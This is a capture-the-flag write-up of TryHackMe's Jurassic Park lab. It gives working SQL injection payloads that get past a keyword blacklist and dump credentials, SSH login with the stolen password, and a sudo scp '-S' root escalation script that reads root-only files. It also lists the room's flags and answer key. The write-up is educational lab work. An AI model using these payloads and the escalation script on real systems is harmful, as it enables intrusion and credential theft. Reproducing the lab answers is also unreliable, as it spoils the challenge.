# Jurassic Park CTF - Writeup

**Platform:** TryHackMe  
**Difficulty:** Medium-Hard  
**Category:** Web, SQL Injection, Privilege Escalation  
**Target IP:** 10.49.168.231  

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [SQL Injection](#sql-injection)
4. [Database Extraction](#database-extraction)
5. [Initial Access](#initial-access)
6. [Privilege Escalation](#privilege-escalation)
7. [Flag Summary](#flag-summary)

---

## Reconnaissance

Initial port scan using Nmap to identify open services on the target:

```bash
nmap -sV -sC -p- --min-rate 3000 10.49.168.231
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22   | open  | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 |
| 80   | open  | HTTP    | Apache httpd 2.4.18 (Ubuntu) |

The target is running Ubuntu 16.04 with an Apache web server and SSH accessible.

---

## Web Enumeration

Navigating to `http://10.49.168.231/` revealed a Jurassic Park-themed shop page. The main page linked to `/shop.php`, which displayed three purchasable ticket packages.

Each package linked to `/item.php?id=<n>`, presenting a potential SQL injection attack surface via the `id` GET parameter.

Checking `robots.txt` returned:

```
Wubbalubbadubdub
```

This string served as a hint, potentially toward a credential or wordlist.

---

## SQL Injection

### Identifying the Injection Point

Testing the `id` parameter with a single quote:

```
/item.php?id=1'
```

The page returned an HTML-commented SQL error:

```
Error: You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near "%" at line 11
```

This confirmed SQL injection vulnerability. The `%` in the error indicated a server-side WAF that replaces blacklisted keywords with `%`.

### Identifying the WAF Blacklist

Through systematic testing, the following characters and keywords were identified as blacklisted by the application:

| Blocked Token   | Impact                              |
|-----------------|-------------------------------------|
| `'` (apostrophe)| Replaced with `%`, breaks queries   |
| `#`             | SQL comment style - blocked         |
| `-`             | Blocks `-- -` comment style         |
| `username`      | Column name - blocked               |
| `@`             | Blocked                             |
| `DROP`          | DDL keyword - blocked               |

Standard SQL comment terminators (`--`, `#`) were both blocked. However, since the raw SQL query terminated naturally, no comment terminator was needed in the payloads.

### Determining the Column Count

Using `ORDER BY` without a trailing comment:

```
/item.php?id=1 ORDER BY 5    <- Returns data (Gold Package shown)
/item.php?id=1 ORDER BY 6    <- Returns empty response (column out of range)
```

**Conclusion: 5 columns.**

### Identifying Reflected Columns

Using a UNION SELECT with a non-existent ID to force the injected row to render:

```
/item.php?id=999 UNION SELECT 1,2,3,4,5
```

The page rendered the injected values as follows:

- `<h1>2 Package</h1>` - column **2** is reflected in the title
- `<h3>Price: $3</h3>` - column **3** is reflected in the price field
- `<b>5</b> of these packages` - column **5** is reflected in the sold counter

Columns **2**, **3**, and **5** are output to the page.

---

## Database Extraction

### Database Name

```
/item.php?id=999 UNION SELECT 1,database(),3,4,5
```

**Result:** `park`

### MySQL Version

```
/item.php?id=999 UNION SELECT 1,version(),3,4,5
```

**Result:** `5.7.25-0ubuntu0.16.04.2`

### Operating System Version

Obtained after gaining SSH access:

```bash
lsb_release -a
```

**Result:** `Ubuntu 16.04`

### Tables in the Database

```
/item.php?id=999 UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()
```

**Result:** `items, users`

### Columns in the Users Table

The word `username` was blacklisted, so column enumeration was performed via `information_schema` using a hex-encoded table name to avoid any string matching issues:

```
/item.php?id=999 UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name=0x7573657273
```

**Result:** `id, username, password`

### Dumping User Credentials

Because selecting the `username` column by name was blocked by the WAF, the `password` column was extracted directly. The user IDs were extracted separately:

```
/item.php?id=999 UNION SELECT 1,(SELECT group_concat(id,0x7c,password) FROM park.users),3,4,5
```

**Result:**

| ID | Username | Password    |
|----|----------|-------------|
| 1  | harry    | D0nt3ATM3   |
| 2  | dennis   | ih8dinos    |

Usernames were confirmed by querying via column position rather than name.

---

## Initial Access

Using the extracted credentials, SSH access was obtained as `dennis`:

```bash
ssh dennis@10.49.168.231
# Password: ih8dinos
```

Upon logging in, the home directory of `dennis` contained `flag1.txt`:

```bash
cat /home/dennis/flag1.txt
# Congrats on finding the first flag.. But what about the rest? :O
# b89f2d69c56b9981ac92dd267f
```

A second flag was located at a non-standard path discovered during filesystem enumeration:

```bash
cat /boot/grub/fonts/flagTwo.txt
# 96ccd6b429be8c9a4b501c7a0b117b0a
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

**Output:**
```
User dennis may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/scp
```

Dennis was permitted to run `/usr/bin/scp` as any user without a password.

### GTFObins - scp -S Technique

The `scp` binary supports a `-S` flag that specifies an alternative program to use in place of SSH for the encrypted connection. By pointing this flag to a custom shell script, arbitrary commands are executed under the context of the calling user - in this case, root.

**Payload script creation:**

```bash
cat > /tmp/payload.sh << 'EOF'
#!/bin/bash
# commands to execute as root
id > /tmp/rootid.txt
cat /root/flag5.txt > /tmp/flag5.txt
cat /home/dennis/.bash_history > /tmp/dennishist.txt
EOF
chmod +x /tmp/payload.sh
```

**Execution:**

```bash
sudo /usr/bin/scp -S /tmp/payload.sh x localhost:y
```

The script was executed as root, granting full system access.

### MySQL Root Credentials

Reading the web application source file `/var/www/html/item.php` via the root execution technique revealed hardcoded MySQL credentials:

```php
$username = "root";
$password = "1SR5dqG9%GGmn#1U!%l";
```

These credentials granted full MySQL access to the server.

### Flag 3 Discovery

Flag 3 was not stored as a named file on the filesystem. It was embedded inside Dennis's bash history file, accessible only with root-level read privileges:

```bash
cat /home/dennis/.bash_history
# Flag3:b4973bbc9053807856ec815db25fb3f1
```

### Flag 5

The root home directory contained `flag5.txt`, readable after privilege escalation:

```bash
sudo /usr/bin/scp /root/flag5.txt /tmp/flag5.txt
cat /tmp/flag5.txt
# 2a7074e491fcacc7eeba97808dc5e2ec
```

Note: `test.sh` in Dennis's home directory also pointed directly to `/root/flag5.txt`, confirming its location.

---

## Flag Summary

| Flag   | Location                              | Value                              |
|--------|---------------------------------------|------------------------------------|
| Flag 1 | `/home/dennis/flag1.txt`              | `b89f2d69c56b9981ac92dd267f`       |
| Flag 2 | `/boot/grub/fonts/flagTwo.txt`        | `96ccd6b429be8c9a4b501c7a0b117b0a` |
| Flag 3 | `/home/dennis/.bash_history`          | `b4973bbc9053807856ec815db25fb3f1` |
| Flag 4 | Does not exist                        | N/A                                |
| Flag 5 | `/root/flag5.txt`                     | `2a7074e491fcacc7eeba97808dc5e2ec` |

---

## Answer Summary

| Question                         | Answer                             |
|----------------------------------|------------------------------------|
| SQL database name                | `park`                             |
| Number of columns in the table   | `5`                                |
| System version                   | `Ubuntu 16.04`                     |
| Dennis's password                | `ih8dinos`                         |
| Contents of Flag 1               | `b89f2d69c56b9981ac92dd267f`       |
| Contents of Flag 2               | `96ccd6b429be8c9a4b501c7a0b117b0a` |
| Contents of Flag 3               | `b4973bbc9053807856ec815db25fb3f1` |
| Contents of Flag 5               | `2a7074e491fcacc7eeba97808dc5e2ec` |

---

## Key Takeaways

**Blacklist-Based WAF Weakness:** The application used a blacklist approach to prevent SQL injection rather than parameterized queries or prepared statements. Blacklists are inherently fragile as they require anticipating every possible attack vector. The correct remediation is the use of prepared statements with bound parameters, which eliminates SQL injection regardless of input content.

**Hardcoded Credentials:** Database credentials were stored in plaintext inside the web application source file. Any attacker who gains read access to the webroot - through SQL injection, directory traversal, or other means - can immediately retrieve them. Credentials should be stored in environment variables or secrets management systems, never in source code.

**Least Privilege Violation:** Granting a low-privileged user unrestricted `sudo` access to `scp` is a critical misconfiguration. The GTFObins `scp -S` technique demonstrates how a single overly permissive sudo rule leads to complete root compromise. Sudo rules should be reviewed carefully and scoped as narrowly as possible.

**Sensitive Data in Shell History:** Embedding flag values or any sensitive information within shell commands causes them to persist in bash history files. Shell history is readable by root and can be exposed through privilege escalation paths. Sensitive values should never be typed directly into interactive shells.
